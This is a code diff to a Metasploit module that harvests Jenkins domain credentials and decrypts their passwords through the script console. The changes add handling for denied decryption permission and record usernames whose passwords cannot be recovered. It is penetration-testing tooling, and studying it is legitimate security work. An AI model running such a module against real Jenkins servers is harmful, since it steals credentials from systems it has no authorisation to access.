@@ -14,8 +14,9 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Jenkins Domain Credential Recovery',
       'Description'    => %q{
-        This module will collect Jenkins domain username and passwords, and uses
-        the script console to decrypt them.
+        This module will collect Jenkins domain credentials, and uses
+        the script console to decrypt each password if anonymous permission
+        is allowed.
 
         It has been tested against Jenkins version 1.590, 1.633, and 1.638.
       },
@@ -163,6 +164,11 @@ class Metasploit3 < Msf::Auxiliary
       }
     })
 
+    if res && /javax\.servlet\.ServletException: hudson\.security\.AccessDeniedException2/ === res.body
+      vprint_error('No permission to decrypt password')
+      return nil
+    end
+
     html = res.get_html_document
     result = html.at('//div[@id="main-panel"]//pre[contains(text(), "Result:")]')
     if result
@@ -208,10 +214,15 @@ class Metasploit3 < Msf::Auxiliary
     credential_data = {
       origin_type: :service,
       module_fullname: fullname,
-      username: opts[:user],
-      private_data: opts[:password],
-      private_type: :password
+      username: opts[:user]
     }.merge(service_data)
+
+    if opts[:password]
+      credential_data.merge!(
+        private_data: opts[:password],
+        private_type: :password
+      )
+    end
 
     login_data = {
       core: create_credential(credential_data),
@@ -235,6 +246,8 @@ class Metasploit3 < Msf::Auxiliary
         else
           print_good("Found credential: #{user_data[:username]}:#{pass} (#{user_data[:description]})")
         end
+      else
+        print_status("Found #{user_data[:username]}, but unable to decrypt password.")
       end
 
       report_cred(
